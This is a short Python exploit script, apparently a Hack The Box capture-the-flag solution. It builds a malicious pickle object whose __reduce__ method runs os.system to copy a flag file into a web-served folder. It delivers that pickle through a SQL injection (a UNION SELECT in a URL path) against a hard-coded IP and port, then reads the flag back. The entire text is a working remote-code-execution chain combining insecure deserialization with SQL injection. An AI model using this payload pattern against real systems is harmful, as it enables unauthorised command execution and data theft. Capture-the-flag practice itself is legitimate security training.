import requests
import re
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('cp /app/flag.txt /app/application/static/flag.txt')
        return os.system, (cmd,)

def generate_payload():
    pickled = pickle.dumps(RCE())
    return base64.urlsafe_b64encode(pickled).decode()

def send_payload(host, port, payload):
    injection = f"1' UNION SELECT '{payload}';--"
    url = f"http://{host}:{port}/view/{injection}"
    response = requests.get(url)

def get_flag(host, port):
    url = f"http://{host}:{port}/static/flag.txt"
    response = requests.get(url)
    flag = re.search(r'HTB\{.*?\}', response.text)
    print(flag.group())


if __name__ == '__main__':
    host, port = "94.237.61.242", 36005
    payload = generate_payload()
    send_payload(host, port, payload)
    get_flag(host, port)
